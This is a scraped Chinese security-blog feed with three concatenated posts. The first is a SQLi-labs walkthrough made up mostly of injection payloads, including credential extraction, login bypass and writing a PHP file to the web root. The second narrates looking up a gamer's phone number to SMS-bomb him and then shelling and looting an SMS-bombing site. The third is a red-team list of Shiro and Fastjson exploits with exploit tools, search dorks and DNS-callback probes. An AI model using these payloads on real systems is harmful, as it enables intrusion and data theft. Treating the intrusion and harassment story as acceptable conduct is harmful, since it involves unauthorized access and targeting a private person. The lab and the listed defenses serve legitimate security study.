支持报错、布尔盲注、延时盲注 if true: 输出 You are in........... else: print_r(mysql_error()); 因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致。\n1 2 3 4 5 6 7 8 9 ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = \u0026#39;security\u0026#39; limit 0,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = \u0026#39;security\u0026#39; limit 3,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = \u0026#39;security\u0026#39; and table_name = \u0026#39;users\u0026#39;),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+ ?id=1\u0026#39; and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)--+ Less-6 请求方式 注入类型 拼接方式 GET 报错、布尔盲注、延时盲注 id=\u0026quot;$id\u0026quot; 和 Less-5 利用方式一致，只是闭合方式不一样，这里不再啰嗦了。\nLess-7 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id=(('$id')) 源码简单分析：\n1 2 3 4 5 6 7 8 9 # 使用单引号加双层括号拼接 $sql=\u0026#34;SELECT * FROM users WHERE id=((\u0026#39;$id\u0026#39;)) LIMIT 0,1\u0026#34;; # 支持布尔盲注、延时盲注 if true: 输出 You are in.... Use outfile...... else: 输出 You have an error in your SQL syntax //print_r(mysql_error()); 因为这里把print_r(mysql_error());给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。\n因为这一关作者很明显地提示了如下信息：\n1 You are in.... Use outfile...... 所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下\n1 2 3 4 5 6 7 8 mysql\u0026gt; show global variables like \u0026#39;%secure%\u0026#39;; +--------------------------+-------+ | Variable_name | Value | +--------------------------+-------+ | require_secure_transport | OFF | | secure_file_priv | NULL | +--------------------------+-------+ 2 rows in set, 1 warning (0.02 sec) secure_file_priv的值为 null ，表示限制 mysqld 不允许导入|导出 当secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv 的值为 空 时，表示不对 mysqld 的导入|导出做限制 在mysql.ini里添加\u0026quot;secure_file_priv=''，保存，重启mysql\n一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：\n1 ?id=1\u0026#39;)) union select * from security.users into outfile \u0026#34;D:/phpstudy_pro/WWW/sqli.pl/Less-7/users.txt\u0026#34;--+ users.txt内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 1\tDumb\tDumb 2\tAngelina\tI-kill-you 3\tDummy\tp@ssword 4\tsecure\tcrappy 5\tstupid\tstupidity 6\tsuperman\tgenious 7\tbatman\tmob!le 8\tadmin\tadmin 9\tadmin1\tadmin1 10\tadmin2\tadmin2 11\tadmin3\tadmin3 12\tdhakkan\tdumbo 14\tadmin4\tadmin4 一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：\n1 ?id=1\u0026#39;)) union select 1,2,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39; into outfile \u0026#34;D:/phpstudy_pro/WWW/sqli.pl/Less-7/info.php\u0026#34;--+ 访问对应的 URL 看看是否解析了呢：\nLess-8 请求方式 注入类型 拼接方式 GET 布尔盲注、延时盲注 id='$id' 和 Less-7 注入方式一致，只是拼接方式不一样\n1 2 3 4 5 ?id=1\u0026#39; and left(database(),1)\u0026gt;\u0026#39;r\u0026#39;--+ ?id=1\u0026#39; and left(database(),1)\u0026gt;\u0026#39;s\u0026#39;--+ ?id=1\u0026#39; and left(database(),2)\u0026gt;\u0026#39;sd\u0026#39;--+ ?id=1\u0026#39; and left(database(),2)\u0026gt;\u0026#39;se\u0026#39;--+ ... Less-9 请求方式 注入类型 拼接方式 GET 延时盲注 id='$id' 和 Less-7 注入方式一致，只是拼接方式不一样\n源码简单分析：\n1 2 3 4 5 6 7 8 # 使用单引号拼接 $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; # 支持延时盲注 if true: 输出 You are in............ else: 输出 You are in........... 从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入.\n1 2 3 4 5 ?id=1\u0026#39; and if(ascii(substr(database(),1,1))\u0026gt;114,1,sleep(5))--+ ?id=1\u0026#39; and if(ascii(substr(database(),1,1))\u0026gt;115,1,sleep(5))--+ ?id=1\u0026#39; and if(ascii(substr(database(),2,1))\u0026gt;100,1,sleep(5))--+ ?id=1\u0026#39; and if(ascii(substr(database(),2,1))\u0026gt;101,1,sleep(5))--+ ... Less-10 请求方式 注入类型 拼接方式 GET 延时盲注 id=\u0026quot;$id\u0026quot; 源码简单分析：\n1 2 3 4 5 6 7 8 9 # 先使用双引号再直接拼接 $id = \u0026#39;\u0026#34;\u0026#39;.$id.\u0026#39;\u0026#34;\u0026#39;; $sql=\u0026#34;SELECT * FROM users WHERE id=$id LIMIT 0,1\u0026#34;; # 支持延时盲注 if true: 输出 You are in............ else: 输出 You are in........... 和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9\nLess-11 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username='x' 源码简单分析：\n1 2 3 4 5 6 7 8 9 10 11 # POST 方式接受变量 $uname=$_POST[\u0026#39;uname\u0026#39;]; $passwd=$_POST[\u0026#39;passwd\u0026#39;]; # 使用单引号拼接 SQL @$sql=\u0026#34;SELECT username, password FROM users WHERE username=\u0026#39;$uname\u0026#39; and password=\u0026#39;$passwd\u0026#39; LIMIT 0,1\u0026#34;; if true: 输出查询的信息 else: print_r(mysql_error()); 和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。\n万能密码 这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：\n1 2 3 4 5 6 mysql\u0026gt; select * from users where username = \u0026#39;admin\u0026#39;; +----+----------+----------+ | id | username | password | +----+----------+----------+ | 8 | admin | admin | +----+----------+----------+ 因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 注释掉 passwd 来登录 uname=admin\u0026#39; or 1=1#\u0026amp;passwd=\u0026amp;submit=Submit uname=admin\u0026#39;#\u0026amp;passwd=\u0026amp;submit=Submit # 注释后面语句 并 添加一个永真条件 uname=admin\u0026amp;passwd=1\u0026#39; or 1#\u0026amp;submit=Submit uname=admin\u0026amp;passwd=1\u0026#39;||1#\u0026amp;submit=Submit uname=admin\u0026amp;passwd=1\u0026#39; or 1#\u0026amp;submit=Submit uname=admin\u0026amp;passwd=1\u0026#39;||1#\u0026amp;submit=Submit # 闭合后面语句 并 添加一个永真条件 uname=admin\u0026amp;passwd=1\u0026#39;or\u0026#39;1\u0026#39;=\u0026#39;1\u0026amp;submit=Submit uname=admin\u0026amp;passwd=1\u0026#39;||\u0026#39;1\u0026#39;=\u0026#39;1\u0026amp;submit=Submit POST 数据里面不能有 +，这里得手动转换为空格\nLess-12 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username=(\u0026quot;x\u0026quot;) 和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。\nLess-13 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 username=('x') 简单源码分析\n1 2 3 4 5 6 7 8 9 10 11 # POST 方式接受变量 $uname=$_POST[\u0026#39;uname\u0026#39;]; $passwd=$_POST[\u0026#39;passwd\u0026#39;]; # 使用单引号和括号来拼接 SQL @$sql=\u0026#34;SELECT username, password FROM users WHERE username=(\u0026#39;$uname\u0026#39;) and password=(\u0026#39;$passwd\u0026#39;) LIMIT 0,1\u0026#34;; if true: 并没有输出啥信息 else: print_r(mysql_error()); 因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。\nLess-14 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 username=\u0026quot;x\u0026quot; 简单源码分析\n1 2 3 4 # 先使用 双引号 再直接带入 SQL 语句 $uname=\u0026#39;\u0026#34;\u0026#39;.$uname.\u0026#39;\u0026#34;\u0026#39;; $passwd=\u0026#39;\u0026#34;\u0026#39;.$passwd.\u0026#39;\u0026#34;\u0026#39;; @$sql=\u0026#34;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\u0026#34;; 和 Less-13 异曲同工，只是拼接方式不一样，我们换对应的闭合方式即可进行注入。\nLess-15 请求方式 注入类型 拼接方式 POST 布尔盲注、延时盲注 username='x' 源码中注释掉了 MySQL 的报错日志，所以这里就不可以进行报错注入了，只能使用布尔盲注或者延时盲注。\n这里不再做重复无意义的记录了。\nLess-16 请求方式 注入类型 拼接方式 POST 布尔盲注、延时盲注 username=(\u0026quot;x\u0026quot;) 和 Less-15 注入类型一致，更换对应的闭合方式即可。\nLess-17 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 password = '$passwd' 简单源码分析:\n1 2 3 4 5 6 7 8 9 10 11 12 13 # uname 参数被过滤了 $uname=check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd=$_POST[\u0026#39;passwd\u0026#39;]; # SELECT 语句只获取了 uname 参数 但是被过滤了 没戏 @$sql=\u0026#34;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\u0026#34;; if select 结果正确: # 更新语句 使用单引号拼接 passwd $update=\u0026#34;UPDATE users SET password = \u0026#39;$passwd\u0026#39; WHERE username=\u0026#39;$row1\u0026#39;\u0026#34;; if mysql 报错: print_r(mysql_error()); 从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：\n1 uname=admin\u0026amp;passwd=1\u0026#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#\u0026amp;submit=Submit Less-18 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 VALUES ('$uagent') 简单源码分析:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 获取请求的 uagent 和 ip 地址 $uagent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; if 输入了uname 和 passwd: # 对这两个参数进行过滤 $uname = check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026#34;; if SQL语句有返回结果: # 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤 $insert=\u0026#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;, $uname)\u0026#34;; 输出 $uagent; print_r(mysql_error()); else: print_r(mysql_error()); 这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。\nPHP 里用来获取客户端 IP 的变量\n$_SERVER['HTTP_CLIENT_IP'] 这个很少使用，不一定服务器都实现了。客户端可以伪造。 $_SERVER['HTTP_X_FORWARDED_FOR']，客户端可以伪造。 $_SERVER['REMOTE_ADDR']，客户端不能伪造。 所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：\n首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /Less-18/ HTTP/1.1 Host: sqli.pl User-Agent: 1\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: http://sqli.pl/Less-18/ DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 34 uname=admin\u0026amp;passwd=0\u0026amp;submit=Submit Less-19 请求方式 注入类型 拼接方式 POST 报错、布尔盲注、延时盲注 VALUES ('$uagent') 简单源码分析:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 获取请求的 referer 和 ip 地址 $uagent = $_SERVER[\u0026#39;HTTP_REFERER\u0026#39;]; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; if 输入了uname 和 passwd: # uname 和 passwd 参数均被过滤 $uname = check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026#34;; if SQL语句有返回结果: # 单引号拼接后直接带入 insert 语句 $insert=\u0026#34;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;)\u0026#34;; 输出 $_SERVER[\u0026#39;HTTP_REFERER\u0026#39;] print_r(mysql_error()); else: print_r(mysql_error()); 本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 POST /Less-19/ HTTP/1.1 Host: sqli.pl User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Referer: 1\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1 DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 34 uname=admin\u0026amp;passwd=0\u0026amp;submit=Submit Less-20 请求方式 注入类型 拼接方式 POST 联合、报错、布尔盲注、延时盲注 username='$cookee' 简单源码分析:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php if cookie 中不存在 uname 参数: 输出了一堆无用的信息 if 提交了 uname 和 passwd: # 进行过滤 $uname = check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026#34;; $cookee = $row1[\u0026#39;username\u0026#39;]; if 有查询结果: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie(\u0026#39;uname\u0026#39;, $cookee, time()+3600); else: print_r(mysql_error()); else: if POST 数据里面没有 submit 参数: $cookee = $_COOKIE[\u0026#39;uname\u0026#39;]; # 直接将 cookee 通过单引号拼接到 SQL 语句中 $sql=\u0026#34;SELECT * FROM users WHERE username=\u0026#39;$cookee\u0026#39; LIMIT 0,1\u0026#34;; if 查询无结果: 输出 mysql_error() if 有结果: 输出查询的信息 else: # 将 uname 的值设置给 cookie 里面的 uname 参数 setcookie(\u0026#39;uname\u0026#39;, $row1[\u0026#39;username\u0026#39;], time()-3600); ?\u0026gt; 从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关\n联合查询注入 1 2 3 4 5 6 7 8 9 10 11 GET /Less-20/ HTTP/1.1 Host: sqli.pl User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: uname=-admin\u0026#39; union select (select group_concat(username,\u0026#39;:\u0026#39;,password+SEPARATOR+0x3c62723e) from users),2,3# DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 报错注入 1 2 3 4 5 6 7 8 9 10 11 GET /Less-20/ HTTP/1.1 Host: sqli.pl User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: uname=admin\u0026#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)# DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 盲注 布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以这里就不演示了。\n","date":"2020-07-20T10:00:36Z","image":"https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png","permalink":"https://360rce.github.io/p/gkoe77ij/","title":"SQLI labs 靶场笔记之基础挑战 1-20 关"},{"content":"起因 事情得从一款叫明日之后的游戏说起，遇到某个口嗨的想要我的信息，顺手反查到他的手机号码。\n可是只有手机号码也没啥用，毕竟又不能喊他约架。然后突然想到土司一个发带后门短信轰炸源码导致被封号的老哥。\n翻了翻帖子，下载到本地搭建了起来，可惜接口不够猛烈啊，于是网上寻找一些收费的轰炸站点，开始黑吃黑。\n故事开始 很快就找到了目标站，这里就不上图了，幸运的发现有死抓死吐的洞，就这样，三分钟弹了个shell到自己服务器上。\n开始疯狂在对方服务器上找数据库，起初以为接口保存在裤子里，但是翻了半天，并没有找到。\n不管三七二十一，把源码和裤子打包到本地慢慢找。\n误导 在phone目录的main.jsp中发现这样一长串的js代码，肯定是做了处理。\n不过这种加密方式以前好像看别人说过怎么解，复制到一个新的html文件，使用alert。\n就这样得到了加密前的源码，可以看出是ajax发包的，于是自己当时十分确定接口就在这些js中。\n切换回client目录的main.jsp文件，确实发现了加密的代码，不过使用的是sojson.v5加密，变量名都被替换了，应该是不能完全解密，在网上也看了一些文章，并没有发现什么详细的解密过程。\n就这样，没有头绪了，眼看接口在眼前却解不开。\n误导 继续翻了翻其他目录，发现old目录下存在main.jsp，对比了下确定是同一个文件，但是这个并没有加密，激动得蹦了起来。\nBut，从上翻到下，并未发现接口的任何信息，只有一个url，而且提供了帐号密码，从提供的这些信息来看，感觉是调用了远程的接口。\n然后我就用提供的这些参数一顿操作，发现无论如何，都是跳转到BC的站，莫非是引流的。\n开始郁闷了，掏出自己03的虚拟机，把源码在本地搭建了起来，是可以正常运行的，而且火力还挺猛。\n利用fd抓包，可以抓到接口的信息，心里暗自高兴，写了个脚本把抓到的信息处理了一下，加到自己的裤子中，结果就收到三四条短信。。。\n继续懵逼 很无奈，决定从头仔细看一遍代码，对调用的函数都跟踪了一下，找到了关键的代码位置。\n抓包发现请求包和响应包都是加密的，在虚拟机自己改代码进行调试，将modelUrls和params输出，然后成功显示出来了。\n继续写脚本处理数据，本以为事情到此结束，可是收到的又是不到10条短信。。。\n悔恨 此时真的不知道接口位置了，只能继续往前推，找到请求的url，“callPhone!callNumberPhone.action”，但是自己对这玩意也不懂呀，不知道代码位置在哪，于是一个目录一个目录的翻，吃了ide的亏，一开始翻的时候ide中并没有显示这些class文件。不然也不会走这么多弯路了。\n结尾 找到了class文件，就进行了反编译，就这样，所有的接口都到手了。\n处理后在本地测试，是自己想要的结果。抽了自己两掌，事情结束。\n","date":"2020-06-20T09:41:33Z","image":"https://w.wallhaven.cc/full/9d/wallhaven-9dg9ow.jpg","permalink":"https://360rce.github.io/p/1p0hplmb/","title":"一次寻找接口的惨痛经历"},{"content":"第一节 各小伙伴们, 安全界一年一度的激动人心的攻防演练盛况即将来临:) 这里给大家准备些弹药, 主要是近些年的可以进后台/getshell的漏洞, 漏洞太多难免疏漏. 基本都是常规操作加一点小技巧, 大部分漏洞均分析过或实践过, 如有错误欢迎【斧】正, 如有补充也欢迎评论留言. 另外, 有些漏洞没有找到外部公开信息, 考虑涉及相关法律法规, 不宜披露, 请见谅. 想深度交流的欢迎沟通. 由于本文长度接近四万字, 所以采取分篇连载.\nApache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437) 1. 漏洞简介\nApache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用\n2. 影响组件\nApache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)\n3. 漏洞指纹\nset-Cookie: rememberMe=deleteMe 或者URL中有shiro字样 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可\n4. Fofa Dork\napp=\u0026quot;Apache-Shiro\u0026quot;\n5. 漏洞分析\n【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞 https://paper.seebug.org/shiro-rememberme-1-2-4/\n6. 漏洞利用\nwyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具 https://github.com/wyzxxz/shiro_rce\nApache Shiro回显poc改造计划 https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw\n7. 利用技巧\n1.使用多个泄露的key进行遍历, 这个在实战中确实有效\n关于Shiro反序列化漏洞的延伸—升级shiro也能被shell https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw\nShiro 100 Key https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA\n2.使用 URLDNS 进行检测提速\n使用适应性最强的URLDNS(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测\n且可以使用ysoserial提前生成序列化内容\njava -jar target/ysoserial-0.0.5-SNAPSHOT-all.jar URLDNS \u0026quot;http://1234567890.test.ceye.io\u0026quot; \u0026gt; urldns.ser\n然后使用占位符+目标url hash的方法修改序列化内容中的urldns地址\n提高检测速度以及后续检测无需使用ysoserial\n例如 1234567890.test.ceye.io 可以换成 md5('www.qq.com').hexdigest() [:10].test.ceye.io\n也就是 9d2c68d82d.test.ceye.io\n可以预先记录 hash\n9d2c68d82d www.qq.com\n然后进行hash查表就可以知道是DNSLOG来自哪个目标, 性能会提高不少\n3.已知目标使用了Shiro, 可以采取Shiro-721的报错逻辑来进行遍历key — 星光哥\n这样即使DNS不能出网, 也可以通过是否返回 rememberMe=deleteMe 来断定 shiro key 的正确性, 前提是服务器有rememberMe=deleteMe相关回显\n8. 防护方法\n1.升级Shiro到最新版\n2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上\n3.WAF拦截Cookie中长度过大的rememberMe值\nApache Shiro Padding Oracle Attack (Shiro-721) 1. 漏洞简介\nApache Shiro 是企业常见的 Java安全框架, 由于Shiro使用AES-CBC模式进行加解密处理, 所以存在Padding Oracle Attack漏洞, 已经登录的攻击者同样可以进行反序列化操作\n2. 影响组件\nApache Shiro \u0026lt; 1.4.2\n3. 漏洞指纹\nset-Cookie: rememberMe=deleteMe URL中有shiro字样 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可\n4. Fofa Dork\napp=\u0026quot;Apache-Shiro\u0026quot;\n5. 漏洞分析\nShiro 721 Padding Oracle攻击漏洞分析 – 安全客, 安全资讯平台 https://www.anquanke.com/post/id/193165\nApache Shiro 远程代码执行漏洞复现 – OnionT’s Blog http://www.oniont.cn/index.php/archives/298.html\n6. 漏洞利用\nwuppp/shiro_rce_exp: Shiro RCE (Padding Oracle Attack) https://github.com/wuppp/shiro_rce_exp\n7. 利用技巧\n1.该漏洞需要登录后获取到合法的Cookie: rememberMe=XXX后才可以进行利用, 看起来不是很好利用\n但实际上有一些网站是开放注册的, 而且这个洞不需要知道服务端密钥\n所以后续的利用还是可以同Shiro-550一样利用, 而且这里是AES加密的, 自带过WAF属性\n2.如果攻击没有生效, 可以试一下删除Cookie中的JSESSIONID 字段, 很多时候这个字段存在的话, 服务端不会去处理 rememberMe\n8. 防护方法\n1.升级Shiro到最新版\n2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上\n3.WAF拦截Cookie中长度过大的rememberMe值\n4.WAF拦截访问过于频繁的IP, 因为该漏洞需要爆破Cookie\nApache Shiro 权限绕过漏洞 (Shiro-682) 1. 漏洞简介\nApache Shiro 是企业常见的Java安全框架, 由于Shiro的拦截器和spring(Servlet)拦截器对于URI模式匹配的差异, 导致出现鉴权问题\n2. 影响组件\nApache Shiro \u0026lt; 1.5.2\n3. 漏洞指纹\nset-Cookie: rememberMe=deleteMe 或者URL中有shiro字样 有一些时候服务器不会主动返回 rememberMe=deleteMe, 直接发包即可\n4. Fofa Dork\napp=\u0026quot;Apache-Shiro\u0026quot;\n5. 漏洞分析\nShiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心 https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/\n6. 漏洞利用\nShiro 权限绕过漏洞分析（CVE-2020-1957） – 斗象能力中心 https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/\n7. 利用技巧\n1.url中间可以尝试添加 ../ , 不限于这个漏洞, 可能会有惊喜, 错误的Nginx配置也会造成新的漏洞\n关于url解析的问题可以参考以下链接\nA New Era of SSRF – Exploiting URL Parser in Trending Programming Languages! https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf\nTomcat URL解析差异性导致的安全问题 – 先知社区 https://xz.aliyun.com/t/7544\n8. 防护方法\n1.升级1.5.2版本及以上\n2.尽量避免使用*通配符作为动态路由拦截器的URL路径表达式.\nFastjson 反序列化远程代码执行漏洞 1. 漏洞简介\nFastjosn 无疑是这两年的漏洞之王, 一手反序列化RCE影响无数厂商, 目前1.2.48以下版本稳定受影响, 1.2.68以下版本开启Autotype会受到影响\n(不排除传说中的1.2.67以下RCE漏洞, 期待八仙过海)\n2. 影响组件\nFastjson \u0026lt; 1.2.48 (\u0026lt;1.2.68?)\n3. 漏洞指纹\n可以通过DNS回显的方式检测后端是否使用Fastjson\n1 2 3 4 5 6 7 8 {\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet6Address\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.InetSocketAddress\u0026#34;{\u0026#34;address\u0026#34;:, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}} {\u0026#34;@type\u0026#34;:\u0026#34;com.alibaba.fastjson.JSONObject\u0026#34;, {\u0026#34;@type\u0026#34;: \u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}}\u0026#34;\u0026#34;} {{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}:\u0026#34;aaa\u0026#34;} Set[{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}] Set[{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}:0 可以通过DOS时间延迟或者报错回显的方式检测\n无损检测Fastjson DoS漏洞以及盲区分Fastjson与Jackson组件 – 斗象能力中心 (\u0026lt;1.2.60) https://blog.riskivy.com/%e6%97%a0%e6%8d%9f%e6%a3%80%e6%b5%8bfastjson-dos%e6%bc%8f%e6%b4%9e%e4%bb%a5%e5%8f%8a%e7%9b%b2%e5%8c%ba%e5%88%86fastjson%e4%b8%8ejackson%e7%bb%84%e4%bb%b6/\nfastjson \u0026lt; 1.2.66 版本最新漏洞分析 